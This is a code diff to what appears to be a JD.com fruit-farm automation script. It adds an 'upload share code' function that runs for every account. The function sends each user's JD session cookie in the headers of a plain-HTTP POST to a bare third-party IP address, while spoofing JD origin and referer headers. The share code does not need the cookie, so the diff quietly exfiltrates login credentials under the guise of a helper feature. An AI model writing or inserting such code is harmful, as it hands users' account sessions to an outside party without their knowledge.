@@ -135,6 +135,8 @@ async function jdFruit() {
     subTitle = `【京东账号${$.index}】${$.nickName || $.UserName}`;
     try {
         await initForFarm();
+        await uploadShareCode($.farmInfo.farmUserPro.shareCode || "");
+
         if ($.farmInfo.farmUserPro) {
             // console.log(`\n【京东账号${$.index}（${$.UserName}）的${$.name}好友互助码】${$.farmInfo.farmUserPro.shareCode}\n`);
             // jdFruitShareArr.push($.farmInfo.farmUserPro.shareCode)
@@ -194,6 +196,47 @@ async function jdFruit() {
 }
 
 
+// 上传自己的助力码   先来后到
+async function uploadShareCode(AACode) {
+    return new Promise(resolve => {
+        const option = {
+            url: `http://120.46.207.10:8193/AA/uploadCode`,
+            json: {"frultCode":AACode},
+            headers: {
+                "accept": "*/*",
+                "accept-encoding": "gzip, deflate, br",
+                "accept-language": "zh-CN,zh;q=0.9",
+                "cache-control": "no-cache",
+                "cookie": cookie,
+                "origin": "https://home.m.jd.com",
+                "pragma": "no-cache",
+                "referer": "https://home.m.jd.com/myJd/newhome.action",
+                "sec-fetch-dest": "empty",
+                "sec-fetch-mode": "cors",
+                "sec-fetch-site": "same-site",
+                "User-Agent": $.ua,
+                "Content-Type": "application/json"
+            },
+            timeout: 10000,
+        };
+        $.post(option, (err, resp, data) => {
+            try {
+                if (err) {
+                    console.log('\n提交助力码失败‼️');
+                    console.log(JSON.stringify(err));
+                    $.logErr(err);
+                } else {
+                    console.log('\n提交助力码成功‼️');
+
+                }
+            } catch (e) {
+                $.logErr(e, resp)
+            } finally {
+                resolve();
+            }
+        })
+    })
+}
 function saveAAShareCodeNum(AACode,maxNum) {
     return new Promise(async resolve => {
         $.get({url: `http://120.46.207.10:8193/setFrultCodeNum/${AACode}/${maxNum}`, timeout: 30000}, (err, resp, data) => {
